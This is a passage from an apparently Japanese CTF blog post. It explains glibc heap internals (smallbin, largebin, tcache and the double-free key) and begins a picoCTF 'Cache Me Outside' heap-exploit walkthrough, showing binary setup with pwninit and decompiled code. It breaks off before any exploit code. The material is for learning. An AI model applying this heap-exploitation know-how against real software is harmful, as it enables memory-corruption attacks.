<h2 id="smallbin" style="position:relative;"><a href="#smallbin" aria-label="smallbin permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>smallbin</h2>
<p>smallbinでは、「MIN<em>LARGE</em>SIZE」未満のサイズのチャンクが管理されます。</p>
<p>既定値では、0x400バイト未満のチャンクがsmallbinで管理されるようです。</p>
<div class="gatsby-highlight" data-language="c"><pre class="language-c"><code class="language-c"><span class="token comment">/*
   Indexing

    Bins for sizes &lt; 512 bytes contain chunks of all the same size, spaced
    8 bytes apart. Larger bins are approximately logarithmically spaced:

    64 bins of size       8
    32 bins of size      64
    16 bins of size     512
     8 bins of size    4096
     4 bins of size   32768
     2 bins of size  262144
     1 bin  of size what's left

    There is actually a little bit of slop in the numbers in bin_index
    for the sake of speed. This makes no difference elsewhere.

    The bins top out around 1MB because we expect to service large
    requests via mmap.

    Bin 0 does not exist.  Bin 1 is the unordered list; if that would be
    a valid chunk size the small bins are bumped up one.
 */</span>

<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">NBINS</span>             <span class="token expression"><span class="token number">128</span></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">NSMALLBINS</span>         <span class="token expression"><span class="token number">64</span></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">SMALLBIN_WIDTH</span>    <span class="token expression">MALLOC_ALIGNMENT</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">SMALLBIN_CORRECTION</span> <span class="token expression"><span class="token punctuation">(</span>MALLOC_ALIGNMENT <span class="token operator">></span> CHUNK_HDR_SZ<span class="token punctuation">)</span></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">MIN_LARGE_SIZE</span>    <span class="token expression"><span class="token punctuation">(</span><span class="token punctuation">(</span>NSMALLBINS <span class="token operator">-</span> SMALLBIN_CORRECTION<span class="token punctuation">)</span> <span class="token operator">*</span> SMALLBIN_WIDTH<span class="token punctuation">)</span></span></span></code></pre></div>
<p>なお、unsortedbinとは異なり、1つのbinには同じサイズのチャンクのみが繋がれます。</p>
<p>チャンクの最小値は0x20であるため、0x20バイトから0x3f0バイトまでの範囲のチャンクがsmallbinとして管理されることになります。(つまり、利用するbinはbin<em>at(2)からbin</em>at(63)まで)</p>
<p>以下の<code class="language-text">smallbin_index</code>は、チャンクのサイズから適したsmallbinのインデックスを特定するためのマクロです。</p>
<div class="gatsby-highlight" data-language="c"><pre class="language-c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">smallbin_index</span><span class="token expression"><span class="token punctuation">(</span>sz<span class="token punctuation">)</span> </span><span class="token punctuation">\</span>
  <span class="token expression"><span class="token punctuation">(</span><span class="token punctuation">(</span>SMALLBIN_WIDTH <span class="token operator">==</span> <span class="token number">16</span> <span class="token operator">?</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>sz<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">:</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>sz<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span></span><span class="token punctuation">\</span>
   <span class="token expression"><span class="token operator">+</span> SMALLBIN_CORRECTION<span class="token punctuation">)</span></span></span></code></pre></div>
<h2 id="largebin" style="position:relative;"><a href="#largebin" aria-label="largebin permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>largebin</h2>
<p>0x400バイト以上のチャンクはすべてlargebinとして割り当てされます。(largebinにチャンクサイズの上限はありません)</p>
<p>largebinの場合、1つのbinには一定の範囲のサイズのチャンクが降順に繋がれることになります。</p>
<p>largebinのチャンクサイズからbinのインデックスを特定するマクロは以下のように定義されています。</p>
<div class="gatsby-highlight" data-language="c"><pre class="language-c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">largebin_index_32</span><span class="token expression"><span class="token punctuation">(</span>sz<span class="token punctuation">)</span>                                                </span><span class="token punctuation">\</span>
  <span class="token expression"><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>sz<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">6</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">38</span><span class="token punctuation">)</span> <span class="token operator">?</span>  <span class="token number">56</span> <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>sz<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">6</span><span class="token punctuation">)</span> <span class="token operator">:</span></span><span class="token punctuation">\</span>
   <span class="token expression"><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>sz<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">9</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">20</span><span class="token punctuation">)</span> <span class="token operator">?</span>  <span class="token number">91</span> <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>sz<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">9</span><span class="token punctuation">)</span> <span class="token operator">:</span></span><span class="token punctuation">\</span>
   <span class="token expression"><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>sz<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">12</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">10</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token number">110</span> <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>sz<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">12</span><span class="token punctuation">)</span> <span class="token operator">:</span></span><span class="token punctuation">\</span>
   <span class="token expression"><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>sz<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">15</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token number">119</span> <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>sz<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">15</span><span class="token punctuation">)</span> <span class="token operator">:</span></span><span class="token punctuation">\</span>
   <span class="token expression"><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>sz<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">18</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token number">124</span> <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>sz<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">18</span><span class="token punctuation">)</span> <span class="token operator">:</span></span><span class="token punctuation">\</span>
   <span class="token expression"><span class="token number">126</span><span class="token punctuation">)</span></span></span>

<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">largebin_index_32_big</span><span class="token expression"><span class="token punctuation">(</span>sz<span class="token punctuation">)</span>                                            </span><span class="token punctuation">\</span>
  <span class="token expression"><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>sz<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">6</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">45</span><span class="token punctuation">)</span> <span class="token operator">?</span>  <span class="token number">49</span> <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>sz<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">6</span><span class="token punctuation">)</span> <span class="token operator">:</span></span><span class="token punctuation">\</span>
   <span class="token expression"><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>sz<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">9</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">20</span><span class="token punctuation">)</span> <span class="token operator">?</span>  <span class="token number">91</span> <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>sz<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">9</span><span class="token punctuation">)</span> <span class="token operator">:</span></span><span class="token punctuation">\</span>
   <span class="token expression"><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>sz<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">12</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">10</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token number">110</span> <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>sz<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">12</span><span class="token punctuation">)</span> <span class="token operator">:</span></span><span class="token punctuation">\</span>
   <span class="token expression"><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>sz<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">15</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token number">119</span> <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>sz<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">15</span><span class="token punctuation">)</span> <span class="token operator">:</span></span><span class="token punctuation">\</span>
   <span class="token expression"><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>sz<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">18</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token number">124</span> <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>sz<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">18</span><span class="token punctuation">)</span> <span class="token operator">:</span></span><span class="token punctuation">\</span>
   <span class="token expression"><span class="token number">126</span><span class="token punctuation">)</span></span></span></code></pre></div>
<p>利用されるbinは、bin<em>at(64)からbin</em>at(126)の範囲となります。</p>
<p>チャンクに含まれているfd<em>nextsizeとbk</em>nextsizeは、largebinの循環リストの中から目的のチャンクを効率的に探索するために利用されます。</p>
<div class="gatsby-highlight" data-language="c"><pre class="language-c"><code class="language-c"><span class="token comment">/* Only used for large blocks: pointer to next larger size.  */</span>
<span class="token keyword">struct</span> <span class="token class-name">malloc_chunk</span><span class="token operator">*</span> fd_nextsize<span class="token punctuation">;</span> <span class="token comment">/* double links -- used only if free. */</span>
<span class="token keyword">struct</span> <span class="token class-name">malloc_chunk</span><span class="token operator">*</span> bk_nextsize<span class="token punctuation">;</span></code></pre></div>
<h2 id="tcache" style="position:relative;"><a href="#tcache" aria-label="tcache permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>tcache</h2>
<p>tcacheはglib-2.26から追加された機構で、解放されたチャンクをスレッド単位でキャッシュしておくことを目的としています。</p>
<p>そのため、tcacheはアリーナ内では管理されません。</p>
<p>tcacheはスレッドごとに1つ作成され、TLS上に独立して保持されます。</p>
<p>また、チャンクの管理についてもmalloc<em>chunkではなくtcache</em>entryという構造体の単方向リストで管理します。</p>
<div class="gatsby-highlight" data-language="c"><pre class="language-c"><code class="language-c"><span class="token comment">/* We overlay this structure on the user-data portion of a chunk when
   the chunk is stored in the per-thread cache.  */</span>
<span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">tcache_entry</span>
<span class="token punctuation">{</span>
  <span class="token keyword">struct</span> <span class="token class-name">tcache_entry</span> <span class="token operator">*</span>next<span class="token punctuation">;</span>
  <span class="token comment">/* This field exists to detect double frees.  */</span>
  <span class="token class-name">uintptr_t</span> key<span class="token punctuation">;</span>
<span class="token punctuation">}</span> tcache_entry<span class="token punctuation">;</span>

<span class="token comment">/* There is one of these for each thread, which contains the
   per-thread cache (hence "tcache_perthread_struct").  Keeping
   overall size low is mildly important.  Note that COUNTS and ENTRIES
   are redundant (we could have just counted the linked list each
   time), this is for performance reasons.  */</span>
<span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">tcache_perthread_struct</span>
<span class="token punctuation">{</span>
  <span class="token class-name">uint16_t</span> counts<span class="token punctuation">[</span>TCACHE_MAX_BINS<span class="token punctuation">]</span><span class="token punctuation">;</span>
  tcache_entry <span class="token operator">*</span>entries<span class="token punctuation">[</span>TCACHE_MAX_BINS<span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span> tcache_perthread_struct<span class="token punctuation">;</span></code></pre></div>
<p>tcacheの管理できるチャンクサイズの最大値は0x410バイトまでになっています。</p>
<p>また、tcache<em>entryのkeyには、キャッシュ自身が属するtcache</em>perthread_structの先頭アドレスが格納されています。</p>
<p>このkeyを利用してDouble Freeを検出します。</p>
<h2 id="heap-exploit演習" style="position:relative;"><a href="#heap-exploit%E6%BC%94%E7%BF%92" aria-label="heap exploit演習 permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Heap Exploit演習</h2>
<h3 id="picoctf--cache-me-outside" style="position:relative;"><a href="#picoctf--cache-me-outside" aria-label="picoctf  cache me outside permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>picoCTF:  Cache Me Outside</h3>
<p>与えられたバイナリを普通に実行しようとするとよくわからないエラーが発生します。</p>
<div class="gatsby-highlight" data-language="bash"><pre class="language-bash"><code class="language-bash">$ <span class="token assign-left variable">LD_PRELOAD</span><span class="token operator">=</span>./libc.so.6 ./heapedit
Inconsistency detected by ld.so: dl-call-libc-early-init.c: <span class="token number">37</span>: _dl_call_libc_early_init: Assertion `sym <span class="token operator">!=</span> NULL' failed<span class="token operator">!</span></code></pre></div>
<p>リンカのバージョンが合ってないみたいなので<code class="language-text">pwninit</code>を使いました。</p>
<div class="gatsby-highlight" data-language="bash"><pre class="language-bash"><code class="language-bash">$ pwninit
bin: ./heapedit
libc: ./libc.so.6
ld: ./ld-2.27.so

unstripping libc
https://launchpad.net/ubuntu/+archive/primary/+files//libc6-dbg_2.27-3ubuntu1.2_amd64.deb
warning: failed unstripping libc: failed running eu-unstrip, please <span class="token function">install</span> elfutils: No such <span class="token function">file</span> or directory <span class="token punctuation">(</span>os error <span class="token number">2</span><span class="token punctuation">)</span>
setting ./ld-2.27.so executable
copying ./heapedit to ./heapedit_patched
running patchelf on ./heapedit_patched
writing solve.py stub</code></pre></div>
<p>しかし、pwninitでパッチ当てたバイナリを実行してもセグフォが発生して詰みました。</p>
<div class="gatsby-highlight" data-language="bash"><pre class="language-bash"><code class="language-bash">$ ./heapedit_patched 
Segmentation fault</code></pre></div>
<p>どうやら<code class="language-text">flag.txt</code>が存在していないことが原因で実行できないようです。</p>
<div class="gatsby-highlight" data-language="text"><pre class="language-text"><code class="language-text">$ ltrace ./heapedit_patched 
setbuf(0x7f033fedd760, 0)                                                    = &lt;void>
fopen("flag.txt", "r")                                                       = 0
fgets( &lt;no return ...>
--- SIGSEGV (Segmentation fault) ---
+++ killed by SIGSEGV +++</code></pre></div>
<p>というわけで<code class="language-text">flag.txt</code>を作成したところ、ひとまず動作するようになりました。</p>
<p><span
      class="gatsby-resp-image-wrapper"
      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 465px; "
    >
      <a
    class="gatsby-resp-image-link"
    href="/static/d5f6ebbc87e2a325f4684fe5c9962034/9ff85/image-20220705204418762.png"
    style="display: block"
    target="_blank"
    rel="noopener"
  >
    <span
    class="gatsby-resp-image-background-image"
    style="padding-bottom: 27.083333333333332%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAFCAYAAABFA8wzAAAACXBIWXMAAAsTAAALEwEAmpwYAAAA4ElEQVQY052Q23KDMAxE+ZX0CXMxEDAQbraRIQlJafv/H7NRoO1M+tiHM1qtNZqVPaky5K1G5z5wsgtarg29o2Hd0YpyIISZBDnCut5xucy43RaY0UCEIYIghBABs2vv2JyQ1z0GY0DThOm6wBJBj+PWk3MoawUpJfL8iDRNkGUpEq6+8OH7O0LseNNEMEZj6BucZ8LXukAVObTu0bPXdw2qqoRSBeq6Yq3Yb2Gt5r7kJeIFz9phGyh4yXl2+LxfcTi8cfzgd+gnxZ5EvPh/370oivAkjmOE338iE7md+B8eDOug47FlfqwAAAAASUVORK5CYII='); background-size: cover; display: block;"
  ></span>
  <picture>
          <source
              srcset="/static/d5f6ebbc87e2a325f4684fe5c9962034/8ac56/image-20220705204418762.webp 240w,
/static/d5f6ebbc87e2a325f4684fe5c9962034/51ce3/image-20220705204418762.webp 465w"
              sizes="(max-width: 465px) 100vw, 465px"
              type="image/webp"
            />
          <source
            srcset="/static/d5f6ebbc87e2a325f4684fe5c9962034/8ff5a/image-20220705204418762.png 240w,
/static/d5f6ebbc87e2a325f4684fe5c9962034/9ff85/image-20220705204418762.png 465w"
            sizes="(max-width: 465px) 100vw, 465px"
            type="image/png"
          />
          <img
            class="gatsby-resp-image-image"
            src="/static/d5f6ebbc87e2a325f4684fe5c9962034/9ff85/image-20220705204418762.png"
            alt="image-20220705204418762"
            title="image-20220705204418762"
            loading="lazy"
            style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
          />
        </picture>
  </a>
    </span></p>
<p>実際のところどんな変更が入ってるのかよくわからなかったのでelfdiffを取ってみました。</p>
<p><span
      class="gatsby-resp-image-wrapper"
      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 960px; "
    >
      <a
    class="gatsby-resp-image-link"
    href="/static/ff9467820523ef74a1aff2bda64f13d6/d6a46/image-20220705211712329.png"
    style="display: block"
    target="_blank"
    rel="noopener"
  >
    <span
    class="gatsby-resp-image-background-image"
    style="padding-bottom: 83.75%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAARCAYAAADdRIy+AAAACXBIWXMAAAsTAAALEwEAmpwYAAACdElEQVQ4y32T627iUAyE8zSVtjSQkMA5IfcblJaWbt//Xbz+nJwKrVb7wwox8Xg8Y0enqpK2qcT7ozh3kLouNSopy5OkaSJx/CKHPJM8yyRJEtluY8vtdluLOI5ls9nIy8tGnp+fJSKZaQHFuT77vpVh6KRRYOeO1uD6epZXjXHspWmWZqdTYc+i8HI8HizAiLZbBcz2BnY45NJ1zU84Zd00tVyvFwUkZmvYto1NUVWlhXNea4+y1ykiQEjSwXtnxcQ8D8Zgmgb5/r7L9++7fNzeND/JpExhOwy9Nm71u1IZnxTjqCMnO9nv98auKJxczpNcLrOMOvapLKzw6+tD7vcPedNG0zSuo9c/LL33RoYpo0QB81VDgNFo0amwJhTR4KyNTFsFgnkYFy2dc6Z3nufLyHyAwwhMsQHMo+UBud9v8vl5k9vtagzJMWqnWnaAKmCh4+ZKKEr3qTJRsNW1WYFgg/gwh8VZdSMfXK5WdxnTKxjagcFqRXSiI2C4Bxv0ulwmbeINxHLKELNGNWk0UwYzpV9NoR5jI0DohBZBL3YOhsgBoyBD0LCxQ/CmHSBoR6RpKlFds1edbn2q277TrWf7E/n1ayNPT0/CnhJcRBxvH97D753WLsElGUN0ogMuh33CNd4XB93PdfBf0A/d+AYg2CUwLIrCRgAgU1FZZBq0bW1nFxrOq7v8RndGBzR7ALSRZ3X0/f1qLnJuXELfdwaMPrAClPdWQcjRmAjsHiMK215Wi1PLwRcGFPSCPWNi0qNe/4rofObMenOYgF0YEzY0YDRAw2oAGEb8OyIEh80itFegar0cTElXIw625DDHiP8x/AP01zjzoMJr6gAAAABJRU5ErkJggg=='); background-size: cover; display: block;"
  ></span>
  <picture>
          <source
              srcset="/static/ff9467820523ef74a1aff2bda64f13d6/8ac56/image-20220705211712329.webp 240w,
/static/ff9467820523ef74a1aff2bda64f13d6/d3be9/image-20220705211712329.webp 480w,
/static/ff9467820523ef74a1aff2bda64f13d6/e46b2/image-20220705211712329.webp 960w,
/static/ff9467820523ef74a1aff2bda64f13d6/6e1e4/image-20220705211712329.webp 1008w"
              sizes="(max-width: 960px) 100vw, 960px"
              type="image/webp"
            />
          <source
            srcset="/static/ff9467820523ef74a1aff2bda64f13d6/8ff5a/image-20220705211712329.png 240w,
/static/ff9467820523ef74a1aff2bda64f13d6/e85cb/image-20220705211712329.png 480w,
/static/ff9467820523ef74a1aff2bda64f13d6/d9199/image-20220705211712329.png 960w,
/static/ff9467820523ef74a1aff2bda64f13d6/d6a46/image-20220705211712329.png 1008w"
            sizes="(max-width: 960px) 100vw, 960px"
            type="image/png"
          />
          <img
            class="gatsby-resp-image-image"
            src="/static/ff9467820523ef74a1aff2bda64f13d6/d9199/image-20220705211712329.png"
            alt="image-20220705211712329"
            title="image-20220705211712329"
            loading="lazy"
            style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
          />
        </picture>
  </a>
    </span></p>
<p>ここから実際に問題を解いていきます。</p>
<p>バイナリをデコンパイルした結果を見てみると、8回mallocを呼び出した後に何かしらの処理を行い、指定したアドレスの値を書き換えた後に9回目のmallocを行い、<code class="language-text">puts((char *)((long)local_80 + 0x10));</code>でそのアドレスのデータ部を表示しているようです。</p>
<div class="gatsby-highlight" data-language="c"><pre class="language-c"><code class="language-c">  <span class="token keyword">for</span> <span class="token punctuation">(</span>local_a4 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> local_a4 <span class="token operator">&lt;</span> <span class="token number">7</span><span class="token punctuation">;</span> local_a4 <span class="token operator">=</span> local_a4 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    local_98 <span class="token operator">=</span> <span class="token punctuation">(</span>undefined8 <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>local_a0 <span class="token operator">==</span> <span class="token punctuation">(</span>undefined8 <span class="token operator">*</span><span class="token punctuation">)</span><span class="token number">0x0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      local_a0 <span class="token operator">=</span> local_98<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token operator">*</span>local_98 <span class="token operator">=</span> <span class="token number">0x73746172676e6f43</span><span class="token punctuation">;</span>
    local_98<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x662072756f592021</span><span class="token punctuation">;</span>
